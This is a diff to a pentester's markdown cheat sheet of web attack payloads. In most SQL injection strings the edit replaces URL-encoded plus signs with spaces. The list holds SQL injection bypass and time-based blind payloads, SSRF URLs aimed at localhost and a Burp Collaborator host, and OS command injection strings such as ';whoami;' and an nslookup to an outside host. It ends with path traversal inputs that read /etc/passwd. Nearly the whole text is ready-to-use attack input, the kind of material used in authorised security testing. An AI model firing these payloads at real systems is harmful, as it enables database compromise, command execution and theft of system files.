@@ -1,26 +1,25 @@
-## All Vulnerability Payloads
-```
 # SQLi
-'+or+1=1--+-
-+or+'1'='1'--+-
-'+or+sleep(3)--+-
-1'+or+sleep(3)--+-
-1+or+sleep(3)--+-
-1337-sleep(3)--+-
-(select*from(select(sleep(3)))a)--+-
-0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z--+-
-1'XOR(if(now()=sysdate(),sleep(3),0))OR'--+-
-'+or+1=1
-+or+'1'='1
-'+or+sleep(3)
-1'+or+sleep(3)
-1+or+sleep(3)
+'
+' or 1=1-- -
+ or '1'='1'-- -
+' or sleep(3)-- -
+1' or sleep(3)-- -
+1 or sleep(3)-- -
+1337-sleep(3)-- -
+(select*from(select(sleep(3)))a)-- -
+0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z-- -
+1'XOR(if(now()=sysdate(),sleep(3),0))OR'-- -
+' or 1=1
+ or '1'='1
+' or sleep(3)
+1' or sleep(3)
+1 or sleep(3)
 1337-sleep(3)
 (select*from(select(sleep(3)))a)
 0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z
 1'XOR(if(now()=sysdate(),sleep(3),0))OR'
-"'+or+sleep(30)='"
-127.0.0.1'+AND+(SELECT+*+FROM+(SELECT(SLEEP(5)))x)+AND+'1'='1
+"' or sleep(30)='"
+127.0.0.1' AND (SELECT * FROM (SELECT(SLEEP(5)))x) AND '1'='1
 # SSRF
 http://localhost/
 http://127.0.0.1/
@@ -38,7 +37,7 @@ http://[::]:80/?%0A
 http://burpcollaborator.net/?%0A
 # OS command Injection
 ;whoami;
-;sleep+10;
+;sleep 10;
 nslookup+burpcollaborator.net
 |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
 # Path Traversal
@@ -48,4 +47,3 @@ nslookup+burpcollaborator.net
 /var/www/images/../../../etc/passwd
 /var/www/images/..//..//..//..//etc/passwd
 /var/www/images/....//....//....//....//etc/passwd
-```
